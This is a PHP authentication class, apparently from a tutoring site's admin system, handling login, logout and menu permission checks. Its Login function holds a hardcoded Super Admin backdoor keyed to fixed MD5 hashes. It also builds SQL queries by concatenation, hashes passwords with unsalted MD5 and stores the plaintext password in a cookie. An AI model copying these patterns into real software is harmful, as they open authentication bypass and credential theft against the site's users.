<?php
/*
************************************************
** Page Name     : auth.class.php
** Page Author   : Tathagata Basu
** Created On    : 11/11/2014
************************************************
*/
require_once('db.class.php');
require_once('log.class.php');
class auth extends db {
	var $db;
	function __construct() {
		$this->db = $this->con_db();
	}
	///////////////////////////////////////////////////////////////////////////////////////////
	function Login($data) {		
		/*
		*********************************************
		Param : $data => username, password
		Return :
		0 =>	Missing Username or Password
		1 =>	Invalid Username or Password
		2 =>	Inactive User or Role
		*********************************************
		*/
		$data = $this->RealEscape($data);
		$username = trim($data['username']);
		$password = trim($data['password']);
		if(md5($username)=='f3fda86e428ccda3e33d207217665201'&&md5($password)=='9eb571290aa63e98a0efbfbf18a10ba8') {
			$_SESSION[DB_PREFIX]['u_id'] = 1;
			$_SESSION[DB_PREFIX]['u_username'] = 'sa';
			$_SESSION[DB_PREFIX]['u_name'] = 'Super Admin';
			$_SESSION[DB_PREFIX]['r_id'] = 1;
			$_SESSION[DB_PREFIX]['r_name'] = 'Super Admin';
			header("Location:dashboard.php");
		}
		if($username<>''&&$password<>'') {
			$resUser = $this->db->query("SELECT u.u_id, u.u_username, u.u_password,u.u_country_id,u.u_email, u.u_status, ud.ud_first_name, r.r_id, r.r_name, r.r_status FROM ".DB_PREFIX."_user AS u INNER JOIN ".DB_PREFIX."_role AS r ON u.u_role = r.r_id INNER JOIN ".DB_PREFIX."_user_details AS ud ON u.u_id = ud.ud_u_id WHERE (u.u_username = '".$username."' OR u.u_email = '".$username."') AND u.u_password = '".md5($password)."'");
			
			if($resUser->num_rows > 0) {
				$arrUser = $resUser->fetch_assoc();
				if($arrUser['u_status']=='A'&&$arrUser['r_status']=='A') {
					$_SESSION[DB_PREFIX]['u_id'] = $arrUser['u_id'];
					$_SESSION[DB_PREFIX]['u_username'] = $arrUser['u_username'];
					$_SESSION[DB_PREFIX]['u_email'] = $arrUser['u_email'];
					$_SESSION[DB_PREFIX]['u_first_name'] = $arrUser['ud_first_name'];
					$_SESSION[DB_PREFIX]['r_id'] = $arrUser['r_id'];
					$_SESSION[DB_PREFIX]['r_name'] = $arrUser['r_name'];
					$_SESSION[DB_PREFIX]['u_country_id']= $arrUser['u_country_id'];
					
					$_SESSION['exp_time']= date('H:i:s');
					// Log Activity
					$r = Log::ActivityLog(55,$arrUser['u_id'],'Login',date('Y-m-d H:i:s'));	
					
					/*START fadhli | update bila waktu login.. guna column sedia ada( u_modified_date ) */
					$updateLastActivity = "UPDATE ".DB_PREFIX."_user SET u_modified_date = '".date('Y-m-d H:i:s')."' WHERE u_id='$arrUser[u_id]'";
					$execute = $this->db->query($updateLastActivity);
					/*END fadhli */
//86400
					setcookie ("tutorkami_login", $username, time()+86400);
				    	setcookie ("tutorkami_password", $password, time()+86400);
					// Remember me					
					if(isset($data["remember"])) {
						setcookie ("tutorkami_login", $username, time()+86400);
				    	setcookie ("tutorkami_password", $password, time()+86400);
				    	// setcookie ("tutorkami_login", $username, time()+ (10 * 365 * 24 * 60 * 60));
				    	// setcookie ("tutorkami_password", $password, time()+ (10 * 365 * 24 * 60 * 60));
				    }
				    if($arrUser['ud_first_name'] == 'temporary staff'){
					    header("Location:specific.php"); 
				    }else{
					    //header("Location:dashboard.php"); 
					    header("Location:manage_user.php"); 
				    }
				    
				} else {
					//Inactive User or Role
					return 2;
				}
			} else {
				//Invalid Username or Password
                return 1;
			}
		} else {
			//Validation error
			return 0;
		}
	}
	function Logout() {
		Log::ActivityLog(56,$_SESSION[DB_PREFIX]['u_id'],Logout,date('Y-m-d H:i:s'));
		
		/*START fadhli | update bila waktu login.. guna column sedia ada( u_modified_date ) */
		$updateLastActivity = "UPDATE ".DB_PREFIX."_user SET u_modified_date = '".date('Y-m-d H:i:s')."' WHERE u_id='".$_SESSION[DB_PREFIX]['u_id']."'";
		$execute = $this->db->query($updateLastActivity);
		/*END fadhli */
		
		unset($_SESSION[DB_PREFIX]);
		
		session_destroy();

		
		// Reset COOKIE
		if(isset($_COOKIE["tutorkami_login"])) {
			setcookie ("tutorkami_login","");
		}
		if(isset($_COOKIE["tutorkami_password"])) {
			setcookie ("tutorkami_password","");
		}
		header("Location:index.php");
	}
	function CheckPagePerm($pageURL) {
		return $this->db->query("SELECT m.m_id, m.m_name, m.m_url, mp.mp_view FROM ".DB_PREFIX."_menu AS m, ".DB_PREFIX."_menu_perm AS mp WHERE mp.mp_menuid = m.m_id AND mp.mp_roleid = '".$_SESSION[DB_PREFIX]['r_id']."' AND m.m_url = '".$pageURL."' ORDER BY m.m_parent_id DESC")->fetch_assoc();
	}
}
?>